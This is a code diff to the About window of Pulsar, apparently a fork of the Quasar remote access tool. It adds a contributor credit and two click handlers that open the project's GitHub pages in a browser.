@@ -15,6 +15,7 @@ namespace Pulsar.Server.Forms
         private const string ContributorsMessage = """
 - [KingKDot](https://github.com/KingKDot) – Lead Developer
 - [TheChosenSkywalker](https://github.com/thechosenskywalker) – Lead Developer
+- [MaxXor](https://github.com/MaxXor) – Original Developer of Quasar RAT
 - [Twobit](https://github.com/officialtwobit) – Multi-Feature Wizard
 - [Lucky](https://t.me/V_Lucky_V) – HVNC Specialist
 - [fedx](https://github.com/fedx-988) – README Designer & Discord RPC
@@ -113,6 +114,7 @@ namespace Pulsar.Server.Forms
 
         private void FrmAbout_Load(object sender, EventArgs e)
         {
+            picIcon.Cursor = Cursors.Hand;
             pictureBox1.Image = SetOpacityGradient(pictureBox1.Image);
             // Ensure this is done in the designer or in code
             cntTxtContent.DetectUrls = true;  // Auto-detect URLs
@@ -142,5 +144,36 @@ namespace Pulsar.Server.Forms
             MessageBox.Show(disclaimer, "Legal Disclaimer", MessageBoxButtons.OK, MessageBoxIcon.Warning);
         }
 
+        private void picIcon_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "https://github.com/Quasar-Continuation/Poopsar",
+                    UseShellExecute = true
+                });
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Unable to open link: " + ex.Message);
+            }
+        }
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            try
+            {
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "https://github.com/quasar/Quasar",
+                    UseShellExecute = true
+                });
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Unable to open link: " + ex.Message);
+            }
+        }
     }
 }
